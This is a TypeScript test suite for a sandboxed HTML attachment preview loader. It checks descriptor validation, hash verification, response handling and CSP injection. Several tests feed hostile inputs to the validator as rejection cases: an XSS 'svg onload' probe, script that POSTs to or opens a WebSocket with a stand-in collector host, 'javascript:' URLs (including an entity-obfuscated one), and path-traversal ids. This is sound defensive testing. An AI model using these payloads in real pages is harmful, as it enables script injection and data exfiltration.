import { describe, expect, it } from "vitest";
import {
  assembleReviewedHtmlDocument,
  fetchVerifiedReviewedAttachment,
  loadReviewedHtmlPreview,
  MAX_REVIEWED_ATTACHMENT_BYTES,
  MAX_REVIEWED_PREVIEW_ASSETS,
  REVIEWED_HTML_PREVIEW_CSP,
  REVIEWED_HTML_PREVIEW_IFRAME_SANDBOX,
  REVIEWED_HTML_PREVIEW_INTEGRATION_STATUS,
  REVIEWED_HTML_PREVIEW_NETWORK_ISOLATION,
  REVIEWED_HTML_PREVIEW_RESIDUAL_RISKS,
  ReviewedHtmlPreviewError,
  reviewedAttachmentContentPath,
  sha256Hex,
  validateReviewedHtmlPreviewDescriptor,
  type ReviewedHtmlPreviewErrorCode,
  type VerifiedReviewedAsset,
} from "./reviewed-html-preview";
import {
  ASSET_FILES,
  buildDescriptor,
  contentUrl,
  createFixtureFetch,
  FIXTURE_ORIGIN,
  FIXTURE_SCOPE,
  fixtureId,
  fixtureResponse,
  HTML_FILE,
  utf8,
  WIZARD_HTML,
  type FixtureFile,
} from "../fixtures/reviewedHtmlPreviewFixtures";

function expectCode(run: () => unknown, code: ReviewedHtmlPreviewErrorCode) {
  let caught: unknown;
  try {
    run();
  } catch (error) {
    caught = error;
  }
  expect(caught).toBeInstanceOf(ReviewedHtmlPreviewError);
  expect((caught as ReviewedHtmlPreviewError).code).toBe(code);
}

async function expectRejectCode(promise: Promise<unknown>, code: ReviewedHtmlPreviewErrorCode) {
  await expect(promise).rejects.toBeInstanceOf(ReviewedHtmlPreviewError);
  await expect(promise).rejects.toMatchObject({ code });
}

function withDescriptor(mutate: (descriptor: Record<string, any>) => void) {
  const descriptor = JSON.parse(JSON.stringify(buildDescriptor())) as Record<string, any>;
  mutate(descriptor);
  return descriptor;
}

function load(fetchImpl: typeof fetch, descriptor: unknown = buildDescriptor(), signal = new AbortController().signal) {
  return loadReviewedHtmlPreview(descriptor, { origin: FIXTURE_ORIGIN, signal, fetchImpl, scope: FIXTURE_SCOPE });
}

function dataUri(file: FixtureFile) {
  return `data:${file.contentType};base64,${Buffer.from(file.bytes).toString("base64")}`;
}

function verifiedAssets(): VerifiedReviewedAsset[] {
  const validated = validateReviewedHtmlPreviewDescriptor(buildDescriptor());
  return validated.assets.map((asset, index) => ({ asset, bytes: ASSET_FILES[index].bytes }));
}

function assemble(html: string) {
  return assembleReviewedHtmlDocument(utf8(html), verifiedAssets());
}

function page(body: string, head = "") {
  return `<!doctype html><html><head>${head}</head><body>${body}</body></html>`;
}

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${REVIEWED_HTML_PREVIEW_CSP}">`
  + `<meta name="referrer" content="no-referrer">`;

describe("sha256Hex", () => {
  it("matches published SHA-256 test vectors", async () => {
    expect(await sha256Hex(utf8(""))).toBe("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
    expect(await sha256Hex(utf8("abc"))).toBe("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
  });
});

describe("validateReviewedHtmlPreviewDescriptor", () => {
  it("accepts the reviewed page with five exact assets and derives fixed content routes", () => {
    const validated = validateReviewedHtmlPreviewDescriptor(buildDescriptor());
    expect(validated.scope).toEqual(FIXTURE_SCOPE);
    expect(validated.assets).toHaveLength(5);
    expect(validated.html.contentPath).toBe(`/api/attachments/${HTML_FILE.attachmentId}/content`);
    for (const [index, asset] of validated.assets.entries()) {
      expect(asset.contentPath).toBe(`/api/attachments/${ASSET_FILES[index].attachmentId}/content`);
    }
    expect(validated.assets.map((asset) => asset.normalizedReference)).toContain("assets/step-2.jpg");
  });

  it("rejects wrong kind, version or unknown fields such as a caller-supplied url", () => {
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.kind = "author-manifest"; })), "invalid_descriptor");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.version = 2; })), "invalid_descriptor");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.html.url = "https://cdn.example.test/page.html"; })), "invalid_descriptor");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].contentPath = "/api/files/logo.png"; })), "invalid_descriptor");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(null), "invalid_descriptor");
  });

  it("requires trusted company, issue, task and review-version binding before any fetch", async () => {
    const { fetchImpl, calls } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES]);
    for (const key of ["companyId", "issueId", "taskId", "reviewVersion"] as const) {
      const descriptor = buildDescriptor();
      const other = { ...FIXTURE_SCOPE, [key]: key === "reviewVersion" ? 2 : fixtureId(999) };
      await expectRejectCode(loadReviewedHtmlPreview(descriptor, {
        origin: FIXTURE_ORIGIN, signal: new AbortController().signal, fetchImpl, scope: other,
      }), "invalid_descriptor");
    }
    expect(calls).toHaveLength(0);
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { delete d.scope; })), "invalid_descriptor");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.scope.reviewVersion = 0; })), "invalid_descriptor");
  });

  it("rejects attachment ids that are not canonical UUIDs", () => {
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.html.attachmentId = "../../secrets"; })), "invalid_descriptor");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.html.attachmentId = d.html.attachmentId.toUpperCase(); })), "invalid_descriptor");
    expectCode(() => reviewedAttachmentContentPath("x/../../issues"), "invalid_descriptor");
  });

  it("rejects hashes that are not exact lowercase SHA-256 hex", () => {
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.html.sha256 = d.html.sha256.toUpperCase(); })), "invalid_descriptor");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[1].sha256 = "abc"; })), "invalid_descriptor");
  });

  it("rejects traversal, nested or mismatched asset references and filenames", () => {
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].reference = "assets/../logo.png"; })), "invalid_reference");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].reference = "assets/img/logo.png"; })), "invalid_reference");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].reference = "assets/other.png"; })), "invalid_reference");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].reference = "https://cdn.example.test/logo.png"; })), "invalid_reference");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].filename = "../logo.png"; })), "invalid_descriptor");
  });

  it("rejects duplicate ids, duplicate bytes and ambiguous duplicate names", () => {
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[1].attachmentId = d.assets[0].attachmentId; })), "duplicate_asset");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[1].attachmentId = d.html.attachmentId; })), "duplicate_asset");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[1].sha256 = d.assets[0].sha256; })), "duplicate_asset");
    expectCode(
      () => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => {
        d.assets.push({ ...d.assets[0], attachmentId: fixtureId(40), filename: "Logo.png", reference: "/assets/Logo.png", sha256: "f".repeat(64) });
      })),
      "duplicate_asset",
    );
  });

  it("rejects disallowed MIME types and extension mismatches", () => {
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].contentType = "image/svg+xml"; })), "unsupported_mime");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].contentType = "image/jpeg"; })), "unsupported_mime");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.html.contentType = "application/xhtml+xml"; })), "unsupported_mime");
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.html.filename = "onboarding-wizard.txt"; })), "unsupported_mime");
  });

  it("caps each file, the aggregate size and the asset count", () => {
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.assets[0].byteSize = MAX_REVIEWED_ATTACHMENT_BYTES + 1; })), "size_limit");
    expectCode(
      () => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => {
        for (const asset of d.assets) asset.byteSize = MAX_REVIEWED_ATTACHMENT_BYTES;
      })),
      "size_limit",
    );
    expectCode(
      () => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => {
        d.assets = Array.from({ length: MAX_REVIEWED_PREVIEW_ASSETS + 1 }, (_, index) => ({
          ...d.assets[0],
          attachmentId: fixtureId(100 + index),
          filename: `a${index}.png`,
          reference: `assets/a${index}.png`,
          sha256: index.toString(16).padStart(64, "0"),
        }));
      })),
      "size_limit",
    );
    expectCode(() => validateReviewedHtmlPreviewDescriptor(withDescriptor((d) => { d.html.byteSize = 0; })), "invalid_descriptor");
  });
});

describe("loadReviewedHtmlPreview", () => {
  it("fetches only the fixed same-origin routes and assembles the exact reviewed page", async () => {
    const { fetchImpl, calls } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES]);
    const result = await load(fetchImpl);

    expect(calls.map((call) => call.url).sort()).toEqual(
      [HTML_FILE, ...ASSET_FILES].map((file) => contentUrl(FIXTURE_ORIGIN, file.attachmentId)).sort(),
    );
    for (const { init } of calls) {
      expect(init?.credentials).toBe("same-origin");
      expect(init?.redirect).toBe("error");
      expect(init?.signal).toBeInstanceOf(AbortSignal);
    }

    // Byte-for-byte: only the head gains the policy and listed references become data URIs.
    const [logo, step1, step2, step3, done] = ASSET_FILES;
    const expected = WIZARD_HTML
      .replace("<head>", `<head>${CSP_META}`)
      .replace(`url("assets/logo.png")`, `url("${dataUri(logo)}")`)
      .replace(`src="assets/step-1.png"`, `src="${dataUri(step1)}"`)
      .replace(`src="/assets/step-2.jpg"`, `src="${dataUri(step2)}"`)
      .replace(`src='assets/step-3.gif'`, `src='${dataUri(step3)}'`)
      .replace(`"assets/done.webp"`, `"${dataUri(done)}"`);
    expect(result.srcDoc).toBe(expected);
    expect(result.srcDoc).toContain(`button.addEventListener("click"`);
    expect(result.srcDoc).toContain(`href="#summary"`);
    expect(result.srcDoc).not.toMatch(/assets\//);
    expect(result.unreferencedAssetIds).toEqual([]);
    expect(result.html.downloadPath).toBe(`/api/attachments/${HTML_FILE.attachmentId}/content?download=1`);
    expect(result.sandbox).toBe("allow-scripts");
  });

  it("rejects tampered bytes of the same length", async () => {
    const { fetchImpl } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) => {
      if (file !== HTML_FILE) return undefined;
      return fixtureResponse(file, url, { body: utf8(WIZARD_HTML.replace("Next", "Pay!")) });
    });
    await expectRejectCode(load(fetchImpl), "hash_mismatch");
  });

  it("renders a reviewed TrueType font from exact bytes and rejects a forged signature", async () => {
    const font: FixtureFile = {
      attachmentId: fixtureId(90), filename: "preview.ttf", contentType: "font/ttf",
      reference: "assets/preview.ttf", bytes: new Uint8Array([0, 1, 0, 0, 1, 2, 3, 4]),
    };
    const validated = validateReviewedHtmlPreviewDescriptor(buildDescriptor(HTML_FILE, [font]));
    const { fetchImpl } = createFixtureFetch(FIXTURE_ORIGIN, [font]);
    const fetched = await fetchVerifiedReviewedAttachment(validated.assets[0], {
      origin: FIXTURE_ORIGIN, signal: new AbortController().signal, fetchImpl,
    });
    expect(fetched).toEqual(font.bytes);
    const html = page("", '<style>@font-face{font-family:preview;src:url("assets/preview.ttf")}</style>');
    const { srcDoc } = assembleReviewedHtmlDocument(utf8(html), [{ asset: validated.assets[0], bytes: fetched }]);
    expect(srcDoc).toContain("data:font/ttf;base64,");
    expect(REVIEWED_HTML_PREVIEW_CSP).toContain("font-src data:");

    const forged = { ...font, bytes: utf8("not-a-font") };
    const forgedDescriptor = validateReviewedHtmlPreviewDescriptor(buildDescriptor(HTML_FILE, [forged]));
    const forgedFetch = createFixtureFetch(FIXTURE_ORIGIN, [forged]);
    await expectRejectCode(fetchVerifiedReviewedAttachment(forgedDescriptor.assets[0], {
      origin: FIXTURE_ORIGIN, signal: new AbortController().signal, fetchImpl: forgedFetch.fetchImpl,
    }), "unsupported_mime");
  });

  it("rejects an asset whose bytes are not the declared image type even if the hash matches", async () => {
    const fake: FixtureFile = { ...ASSET_FILES[0], bytes: utf8("<svg onload=alert(1)>") };
    const descriptor = buildDescriptor(HTML_FILE, [fake, ...ASSET_FILES.slice(1)]);
    const { fetchImpl } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, fake, ...ASSET_FILES.slice(1)]);
    await expectRejectCode(load(fetchImpl, descriptor), "unsupported_mime");
  });

  it("rejects redirected, opaque, wrong-URL and non-200 responses", async () => {
    const cases: Array<[Parameters<typeof fixtureResponse>[2], ReviewedHtmlPreviewErrorCode]> = [
      [{ redirected: true }, "redirect_rejected"],
      [{ type: "opaqueredirect" }, "redirect_rejected"],
      [{ type: "cors" }, "unexpected_response"],
      [{ url: "https://cdn.example.test/page.html" }, "unexpected_response"],
      [{ url: `${FIXTURE_ORIGIN}/api/attachments/${fixtureId(99)}/content` }, "unexpected_response"],
      [{ status: 206 }, "unexpected_response"],
      [{ status: 404 }, "unexpected_response"],
    ];
    for (const [overrides, code] of cases) {
      const { fetchImpl } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) =>
        file === ASSET_FILES[2] ? fixtureResponse(file, url, overrides) : undefined);
      await expectRejectCode(load(fetchImpl), code);
    }
  });

  it("reports a fetch-level failure such as a browser-blocked redirect", async () => {
    const { fetchImpl } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file) => {
      if (file === HTML_FILE) throw new TypeError("Failed to fetch (redirect mode is error)");
      return undefined;
    });
    await expectRejectCode(load(fetchImpl), "fetch_failed");
  });

  it("rejects the wrong served content type", async () => {
    const htmlAsText = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) =>
      file === HTML_FILE ? fixtureResponse(file, url, { contentType: "text/plain" }) : undefined);
    await expectRejectCode(load(htmlAsText.fetchImpl), "unsupported_mime");

    const jpegAsPng = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) =>
      file === ASSET_FILES[2] ? fixtureResponse(file, url, { contentType: "image/png" }) : undefined);
    await expectRejectCode(load(jpegAsPng.fetchImpl), "unsupported_mime");

    const missing = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) =>
      file === ASSET_FILES[0] ? fixtureResponse(file, url, { contentType: null }) : undefined);
    await expectRejectCode(load(missing.fetchImpl), "unsupported_mime");
  });

  it("fails closed when the response body has no bounded stream", async () => {
    const { fetchImpl } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) => {
      if (file !== HTML_FILE) return undefined;
      const response = fixtureResponse(file, url);
      Object.defineProperty(response, "body", { value: null });
      Object.defineProperty(response, "arrayBuffer", { value: () => { throw new Error("unbounded read"); } });
      return response;
    });
    await expectRejectCode(load(fetchImpl), "unexpected_response");
  });

  it("rejects Content-Length violations and oversized bodies", async () => {
    const wrongHeader = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) =>
      file === HTML_FILE ? fixtureResponse(file, url, { contentLength: String(file.bytes.byteLength + 1) }) : undefined);
    await expectRejectCode(load(wrongHeader.fetchImpl), "length_mismatch");

    const longer = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) =>
      file === HTML_FILE
        ? fixtureResponse(file, url, { contentLength: null, body: utf8(`${WIZARD_HTML}<!-- extra -->`) })
        : undefined);
    await expectRejectCode(load(longer.fetchImpl), "length_mismatch");

    const shorter = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES], (file, url) =>
      file === HTML_FILE ? fixtureResponse(file, url, { contentLength: null, body: utf8("<!doctype html>") }) : undefined);
    await expectRejectCode(load(shorter.fetchImpl), "length_mismatch");
  });

  it("refuses a non-origin base and never fetches it", async () => {
    const { fetchImpl, calls } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE]);
    const validated = validateReviewedHtmlPreviewDescriptor(buildDescriptor());
    await expectRejectCode(
      fetchVerifiedReviewedAttachment(validated.html, {
        origin: `${FIXTURE_ORIGIN}/evil/`,
        signal: new AbortController().signal,
        fetchImpl,
      }),
      "fetch_failed",
    );
    expect(calls).toHaveLength(0);
  });

  it("cancels every in-flight download when the caller aborts", async () => {
    const signals: AbortSignal[] = [];
    const fetchImpl = ((_url: string, init?: RequestInit) => new Promise<Response>((_resolve, reject) => {
      signals.push(init!.signal!);
      init!.signal!.addEventListener("abort", () => reject(new DOMException("Aborted", "AbortError")));
    })) as unknown as typeof fetch;
    const controller = new AbortController();
    const pending = load(fetchImpl, buildDescriptor(), controller.signal);
    await Promise.resolve();
    controller.abort();
    await expectRejectCode(pending, "aborted");
    expect(signals).toHaveLength(6);
    expect(signals.every((signal) => signal.aborted)).toBe(true);
  });

  it("cancels sibling downloads when one file fails verification", async () => {
    const signals: AbortSignal[] = [];
    const fetchImpl = ((url: string, init?: RequestInit) => {
      signals.push(init!.signal!);
      if (url === contentUrl(FIXTURE_ORIGIN, HTML_FILE.attachmentId)) {
        return Promise.resolve(fixtureResponse(HTML_FILE, url, { status: 500 }));
      }
      return new Promise<Response>((_resolve, reject) => {
        init!.signal!.addEventListener("abort", () => reject(new DOMException("Aborted", "AbortError")));
      });
    }) as unknown as typeof fetch;
    await expectRejectCode(load(fetchImpl), "unexpected_response");
    expect(signals.every((signal) => signal.aborted)).toBe(true);
  });

  it("rejects before fetching when already aborted", async () => {
    const { fetchImpl, calls } = createFixtureFetch(FIXTURE_ORIGIN, [HTML_FILE, ...ASSET_FILES]);
    const controller = new AbortController();
    controller.abort();
    await expectRejectCode(load(fetchImpl, buildDescriptor(), controller.signal), "aborted");
    expect(calls).toHaveLength(0);
  });

  it("reports listed assets the page never references", async () => {
    const html: FixtureFile = { ...HTML_FILE, bytes: utf8(page(`<img src="assets/logo.png" alt="">`)) };
    const descriptor = buildDescriptor(html, ASSET_FILES.slice(0, 2));
    const { fetchImpl } = createFixtureFetch(FIXTURE_ORIGIN, [html, ...ASSET_FILES.slice(0, 2)]);
    const result = await load(fetchImpl, descriptor);
    expect(result.unreferencedAssetIds).toEqual([ASSET_FILES[1].attachmentId]);
  });
});

describe("assembleReviewedHtmlDocument", () => {
  it("keeps ordinary inline script, inline SVG namespaces and fragment links intact", () => {
    const html = page(
      `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><rect width="4" height="4"/></svg>
       <a href="#next">Next</a>
       <script>let data = { step: 1 }; const action = "next"; var src = data.step > 0 ? "a" : "b";</script>`,
    );
    const { srcDoc } = assemble(html);
    expect(srcDoc).toBe(html.replace("<head>", `<head>${CSP_META}`));
  });

  it("rejects unlisted, traversal and ambiguous local references instead of stripping them", () => {
    expectCode(() => assemble(page(`<img src="assets/missing.png">`)), "unlisted_asset");
    expectCode(() => assemble(page(`<img src="assets/../logo.png">`)), "unlisted_asset");
    expectCode(() => assemble(page(`<img src="./assets/logo.png">`)), "unlisted_asset");
    expectCode(() => assemble(page(`<img src="../secrets.png">`)), "unlisted_asset");
    expectCode(() => assemble(page(`<a href="next-page.html">Next</a>`)), "unlisted_asset");
    expectCode(() => assemble(page(`<img src="Assets/logo.png">`)), "unlisted_asset");
    expectCode(() => assemble(page(`<img src="">`)), "invalid_reference");
    expectCode(() => assemble(page(`<img src="assets%2Flogo.png">`)), "invalid_reference");
    expectCode(() => assemble(page(`<img src="assets&#47;logo.png">`)), "invalid_reference");
    expectCode(() => assemble(page(`<script>img.src = "assets/" + name;</script>`)), "invalid_reference");
    expectCode(() => assemble(page(`<script>img.src = "assets/unlisted.png";</script>`)), "unlisted_asset");
  });

  it("rejects remote subresources in markup, CSS and script", () => {
    expectCode(() => assemble(page(`<img src="https://cdn.example.test/kite.png">`)), "remote_reference");
    expectCode(() => assemble(page(`<script src="//cdn.example.test/app.js"></script>`)), "remote_reference");
    expectCode(() => assemble(page("", `<style>.a { background: url(//cdn.example.test/x.png) }</style>`)), "remote_reference");
    expectCode(() => assemble(page(`<script>fetch("https://collector.example.test/", { method: "POST" })</script>`)), "remote_reference");
    expectCode(() => assemble(page(`<script>new WebSocket("wss://collector.example.test")</script>`)), "remote_reference");
  });

  it("distinguishes a script's inert iframe template from a live iframe tag", () => {
    const html = page('<script>const later = `<iframe src="/example"></iframe>`;</script>');
    expect(assemble(html).srcDoc).toContain('const later = `<iframe');
    expectCode(() => assemble(page('<iframe src="/example"></iframe>')), "unsafe_html");
  });

  it("rejects CSS imports, base tags, meta overrides, embedded frames and srcset", () => {
    expectCode(() => assemble(page("", `<style>@import "assets/logo.png";</style>`)), "unsafe_html");
    expectCode(() => assemble(page("", `<base href="/">`)), "unsafe_html");
    expectCode(() => assemble(page("", `<meta http-equiv="refresh" content="0">`)), "unsafe_html");
    expectCode(() => assemble(page(`<iframe title="x"></iframe>`)), "unsafe_html");
    expectCode(() => assemble(page(`<object title="x"></object>`)), "unsafe_html");
    expectCode(() => assemble(page(`<img srcset="assets/logo.png 1x">`)), "unsafe_html");
  });

  it("rejects active URL schemes, including entity-obfuscated ones", () => {
    expectCode(() => assemble(page(`<a href="javascript:void(0)">x</a>`)), "unsafe_html");
    expectCode(() => assemble(page(`<a href="java&#115;cript:void(0)">x</a>`)), "unsafe_html");
    expectCode(() => assemble(page(`<img src="data:image/png;base64,AAAA">`)), "unsafe_html");
    expectCode(() => assemble(page(`<script>location = "blob:x";</script>`)), "unsafe_html");
  });

  it("injects the policy after a quoted greater-than sign in the head tag", () => {
    const html = '<!doctype html><html><head data-note=">"><script>window.fixtureRan = true</script></head><body>ok</body></html>';
    const { srcDoc } = assemble(html);
    expect(srcDoc).toContain(`<head data-note=">">${CSP_META}<script>`);
    expect(srcDoc).not.toContain(`data-note="${CSP_META}`);
  });

  it("requires a single head with nothing loadable before it", () => {
    expectCode(() => assemble(`<p>hi</p>`), "unsafe_html");
    expectCode(() => assemble(`<script>1</script><html><head></head></html>`), "unsafe_html");
    expectCode(() => assemble(`<html><head></head><head></head></html>`), "unsafe_html");
    expect(assemble(`<!doctype html><html><!-- inert build note --><head></head><body></body></html>`).srcDoc).toContain(CSP_META);
  });

  it("rejects bytes that are not valid UTF-8", () => {
    expectCode(() => assembleReviewedHtmlDocument(new Uint8Array([0x3c, 0xff, 0xfe]), verifiedAssets()), "invalid_html");
  });
});

describe("sandbox and network contract", () => {
  it("uses exactly allow-scripts and a CSP that denies fetches, forms, frames, objects and workers", () => {
    expect(REVIEWED_HTML_PREVIEW_IFRAME_SANDBOX).toBe("allow-scripts");
    for (const directive of [
      "default-src 'none'",
      "connect-src 'none'",
      "form-action 'none'",
      "frame-src 'none'",
      "child-src 'none'",
      "object-src 'none'",
      "worker-src 'none'",
      "base-uri 'none'",
      "img-src data:",
    ]) {
      expect(REVIEWED_HTML_PREVIEW_CSP).toContain(directive);
    }
    expect(REVIEWED_HTML_PREVIEW_CSP).not.toMatch(/unsafe-eval|https?:|\*|'self'/);
  });

  it("never claims the preview is network-free", () => {
    expect(REVIEWED_HTML_PREVIEW_NETWORK_ISOLATION).toBe("not-guaranteed");
    const risks = REVIEWED_HTML_PREVIEW_RESIDUAL_RISKS.join(" ");
    expect(risks).toMatch(/navigat/i);
    expect(risks).toMatch(/connect-src 'none'/);
    expect(risks).not.toMatch(/network[- ]free|no network access|fully isolated/i);
  });

  it("marks source integration as pending installation", () => {
    expect(REVIEWED_HTML_PREVIEW_INTEGRATION_STATUS).toBe("source-integrated-pending-install");
  });
});
